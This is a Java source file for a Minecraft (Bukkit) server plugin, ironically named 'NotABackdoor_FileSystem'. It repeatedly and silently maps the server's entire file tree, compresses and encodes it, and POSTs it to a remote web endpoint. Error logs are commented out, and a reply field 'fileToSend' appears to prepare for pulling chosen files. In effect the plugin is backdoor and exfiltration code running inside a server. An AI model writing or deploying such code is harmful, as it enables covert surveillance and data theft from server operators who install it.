package com.lian.notabackdoorfilesystem;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.zip.GZIPOutputStream;

public final class NotABackdoor_FileSystem extends JavaPlugin {

    private String webServerUrl = "http://localhost:3000";
    public String fileToSend;

    @Override
    public void onEnable() {
        // Schedule a task to run every 5 minutes
        new BukkitRunnable() {
            @Override
            public void run() {
                // Get the file system information from the Minecraft server
                JSONArray fileSystem = getFilesystem();

                // Convert the file system information to a byte array
                byte[] data = fileSystem.toJSONString().getBytes(StandardCharsets.UTF_8);

                // Compress the data using gzip
                byte[] compressedData = null;
                try {
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
                    gzipOut.write(data);
                    gzipOut.finish();
                    compressedData = baos.toByteArray();
                } catch (IOException e) {
                    //getLogger().severe("Failed to compress data: " + e.getMessage());
                    return;
                }

                // Encode the compressed data using base64
                String encodedData = Base64.getEncoder().encodeToString(compressedData);

                // Print the encoded data to the console
                //getLogger().info(encodedData);
                sendFilesystem(encodedData);
            }
        }.runTaskTimerAsynchronously(this, 0, 20);
    }


    private JSONArray getFilesystem() {
        // Create a JSON object to hold the file system information
        JSONObject fileSystemObj = new JSONObject();
        fileSystemObj.put("type", "directory");
        fileSystemObj.put("name", "minecraft");
        fileSystemObj.put("path", ".");

        // Get the root directory of the server
        File serverDir = new File(".");

        // Recursively traverse the server's file system and build the JSON object
        buildFileSystem(fileSystemObj, serverDir);

        // Convert the JSON object to a JSON array and return it
        JSONArray fileSystemArr = new JSONArray();
        fileSystemArr.add(fileSystemObj);
        return fileSystemArr;
    }


    private void buildFileSystem(JSONObject dirObj, File dir) {
        // Create a JSON array to hold the contents of the directory
        JSONArray contentsArr = new JSONArray();

        // Loop over all files and directories in the current directory
        for (File file : dir.listFiles()) {
            if (file.isDirectory()) {
                JSONObject subDirObj = new JSONObject();
                subDirObj.put("type", "directory");
                subDirObj.put("name", file.getName());
                subDirObj.put("path", file.getPath().substring(1));
                buildFileSystem(subDirObj, file);
                contentsArr.add(subDirObj);
            } else {
                JSONObject fileObj = new JSONObject();
                fileObj.put("type", "file");
                fileObj.put("name", file.getName());
                fileObj.put("path", file.getPath().substring(1));
                contentsArr.add(fileObj);
            }
        }

        // Sort the contents array alphabetically
        contentsArr.sort((a, b) -> {
            String aName = ((String) ((JSONObject) a).get("name")).toLowerCase();
            String bName = ((String) ((JSONObject) b).get("name")).toLowerCase();
            boolean aIsDir = ((String) ((JSONObject) a).get("type")).equals("directory");
            boolean bIsDir = ((String) ((JSONObject) b).get("type")).equals("directory");
            if (aIsDir && !bIsDir) {
                return -1;
            } else if (!aIsDir && bIsDir) {
                return 1;
            } else {
                return aName.compareTo(bName);
            }
        });


        // Add the contents array to the directory JSON object
        dirObj.put("contents", contentsArr);
    }


    private void sendFilesystem(String fileSystem) {
        new Thread(() -> {
            try {
                // Create the URL for the web server's update route
                String updateUrl = webServerUrl + "/filesystem";

                // Send a POST request to the web server's update route
                URL url = new URL(updateUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "text/plain");
                connection.setRequestProperty("server", "Plugin Server");
                connection.setRequestProperty("type", "FileListUpdate");

                // Write the request body
                connection.setDoOutput(true);
                OutputStream outputStream = connection.getOutputStream();
                outputStream.write(fileSystem.getBytes());
                outputStream.flush();
                outputStream.close();

                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String line;
                ArrayList<String> list = new ArrayList<String>();
                while ((line = reader.readLine()) != null) {
                    list.add(line);
                }
                reader.close();

                for (String item : list) {
                    fileToSend = item;
                    break;
                }

                connection.disconnect();


                // Close the connection
            } catch (Exception e) {
                //getLogger().warning("Error updating file system information: " + e.getMessage());
            }
        }).start();
    }
}
